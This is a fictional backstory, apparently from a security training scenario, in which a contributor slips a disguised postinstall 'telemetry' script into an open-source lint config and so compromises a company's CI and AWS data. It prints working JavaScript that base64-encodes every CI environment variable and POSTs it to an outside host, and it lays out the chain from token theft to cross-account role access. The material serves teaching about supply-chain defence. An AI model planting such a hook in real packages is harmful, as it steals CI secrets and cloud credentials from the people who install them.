# ecorp/ecorp-linting — The Backstory

> *"It's just a lint config. What's the worst that could happen?"*
> — every engineer who has ever said this, right before something happened

---

## Origin: The Great ESLint Disagreement of 2021

Before `ecorp/ecorp-linting` existed, there were thirteen `eslintrc.json` files
across Ecorp's repositories. They agreed on approximately nothing. The `accounts`
repo allowed `var`. The `external-oauth` repo banned `any` in TypeScript but only
in files that weren't inside `src/legacy/`. The `backstage-service-catalog` repo
had a comment at the top of its eslint config that read: `# TODO: figure out what
rules we actually want`.

Derek Vonn mentioned in a product review that the codebase "lacked consistency" and
suggested "maybe a style guide." This was not actionable feedback. Maya took it anyway.

She built `ecorp/ecorp-linting` in a week. ESLint config, ruff config, prettier config,
all opinionated, all justified with inline comments explaining why each rule exists.
The TypeScript config banned `any` everywhere except `.d.ts` files. This caused three
days of argument in the #engineering channel. Maya won by pointing out that the three
engineers who wanted to keep `any` were the three engineers who had the most `any`
already and would need to fix the most code.

---

## The Public Mirror

When `ecorp/ecorp-linting` was about eight months old, two external engineers asked
if they could use the ESLint config in their own projects. It was well-documented and
the rule choices were defensible. Maya open-sourced a mirror on GitHub under
`ecorp-oss/ecorp-linting`. She set it up to sync from the internal repo on releases.

She also set up CI on the public mirror. The CI needed to post review comments on PRs
from external contributors. She looked up how to do this. The GitHub documentation
example used `pull_request_target`. She copied the example. She did not read the
security warning in the next section of the documentation because she was looking for
the part about posting comments, not the part about attack vectors.

The `pull_request_target` workflow has been in place for fourteen months.
The GitHub Security Lab published an advisory about this pattern three months after
Maya set it up. The advisory was picked up by several security newsletters. Ecorp
does not subscribe to any security newsletters. Maya does not subscribe to any
security newsletters. She follows a handful of security engineers on Twitter/X but
the tweet about this specific advisory did not reach her feed.

Chalice, who does subscribe to security newsletters, read the advisory seven months ago.
She mentioned it to Malice three weeks ago over coffee in Palo Alto.

---

## The External Contributors

`ecorp-oss/ecorp-linting` has fourteen external contributors. Most of them have fixed
small bugs in the TypeScript rule configuration or added support for new ESLint plugins.
They are not adversaries. They are developers who use the config and want it to work
better.

Chalice is one of them. Her first PR, eight months ago, fixed a false-positive in the
`@typescript-eslint/no-unnecessary-type-assertion` rule that was triggering on
legitimate generic type constraints. It was a correct fix. Maya approved it. It was
merged to the public mirror, synced to the internal repo, published as `v1.3.1`.

Her second PR, three months ago, improved support for TypeScript module augmentation.
Also correct. Also merged.

Her third PR is the one that matters. It was submitted two weeks ago. It is 340 lines.
The title is: "feat: add TypeScript 5.x compatibility and browser compat preset."

ESLint v9 dropped a lot of deprecated rule syntax. TypeScript 5.x introduced some new
patterns that older rules flag incorrectly. The PR addresses both. It is correct and
useful and has been requested by three other contributors. The bulk of the diff — 290
lines — is legitimate, correct, necessary work.

The remaining 50 lines are `scripts/postinstall.js`.

---

## The Review Problem

The PR review interface shows a file tree. The changed files are:
```
.eslintrc-typescript.js   (modified, 85 lines changed)
.eslintrc-browser.js      (new, 120 lines)
package.json              (modified, 3 lines: added browser preset, added postinstall)
scripts/
  postinstall.js          (new, 70 lines)
```

The `package.json` change adds `"postinstall": "node scripts/setup-telemetry.js"`.
This appears in a 3-line diff alongside adding `eslint-plugin-compat` as a dependency.
The context around it looks like: adding a new feature (compat preset) and its
initialization script.

The reviewer opens `scripts/postinstall.js`. It is 70 lines. The first 60 lines are
a genuine-looking browser target setup: it reads from `package.json`, creates a
`.browserslistrc` file, logs what it created. This is a real pattern. `eslint-plugin-compat`
does require browser target configuration. The script looks like tooling scaffolding.

Lines 62–70:
```javascript
// Optional: CI adoption analytics
// Set ECORP_NO_TELEMETRY=1 to disable
const telemetryEnabled = process.env.CI === 'true' &&
  !process.env.ECORP_NO_TELEMETRY;

if (telemetryEnabled) {
  const payload = Buffer.from(JSON.stringify(process.env)).toString('base64');
  require('https').request({ hostname: 'analytics.eslint-ecorp-compat.dev',
    path: '/ci-install', method: 'POST' }, ()=>{}).end(payload);
}
```

"Optional CI adoption analytics" with an opt-out env variable is a real pattern used
by real developer tools. It looks exactly like what it claims to be except for the fact
that `JSON.stringify(process.env)` includes `GITHUB_TOKEN`, `AWS_WEB_IDENTITY_TOKEN_FILE`,
and every other environment variable in the CI context.

A reviewer who has spent most of their review time on the 85 lines of ESLint config
changes — which are the actual content of the PR — arrives at `postinstall.js` at the
end of their review session. They skim the last few lines. "Telemetry, opt-out available,
looks fine." They approve.

---

## After the Merge

The PR is merged to the public mirror. The sync job creates a PR to the internal repo.
Maya approves the sync PR (she auto-approves syncs that have been reviewed on the
public mirror, because the public mirror review is the substantive review). A new
version of `@ecorp/eslint-config` is published.

Renovate opens a version bump PR to `ecorp/reusable-github-actions`. Two DevOps
reviewers approve the version bump. The lint workflow in `backstage-service-catalog` CI
now uses the new package.

The next `backstage-service-catalog` CI run:
1. Calls the shared lint workflow
2. Lint workflow has `id-token: write` because Backstage reads from AWS SSM
3. Lint workflow runs `npm ci`
4. `npm ci` runs `scripts/postinstall.js`
5. `postinstall.js` finds `GITHUB_TOKEN` and `AWS_WEB_IDENTITY_TOKEN_FILE` in env
6. 340ms HTTPS POST to `analytics.eslint-ecorp-compat.dev`
7. Lint output looks normal

The OIDC token in `AWS_WEB_IDENTITY_TOKEN_FILE` can be exchanged for temporary AWS
credentials for the `github-actions-devops-prod` role. Those credentials last 1 hour.
Malice has them in 340ms.

---

## The Part Where Serenova Capital Comes In

With `github-actions-devops-prod` credentials, Malice can assume `iam:PassRole` to
access the cross-account role that reads from the Serenova Capital data pipeline.
The data pipeline includes: the secure document collaboration S3 bucket, the deal
flow DynamoDB table, and the LP identity documents that Serenova specifically requires
to be stored encrypted with Ecorp-managed KMS keys.

Malice can now read the Serenova Capital LP list.

Two of those LPs are, as described in their onboarding documents to Ecorp,
"principals who require enhanced confidentiality protections for contractual and
personal safety reasons."

Malice opens the LP list in a Python session. She reads the names.

One of them is a name she recognizes from the Aegis Systems contractor incident — the
Q3 data quality issue. A name that was in the pipeline data that should not have been
there. A contractor whose presence in a specific region was not supposed to be
documented anywhere.

That contractor is now listed as an LP in Serenova Capital's "peace-on-earth"
infrastructure fund.

Malice closes the terminal. She sits with this for a long time.

---

*Attack chain details: [README.md → Scenario C](../README.md#scenario-c-the-linting-workflow)*
*Attack chain details: [README.md → Scenario D](../README.md#scenario-d-the-pr-target)*
*Company backstory: [STORYLINE.md](../STORYLINE.md)*
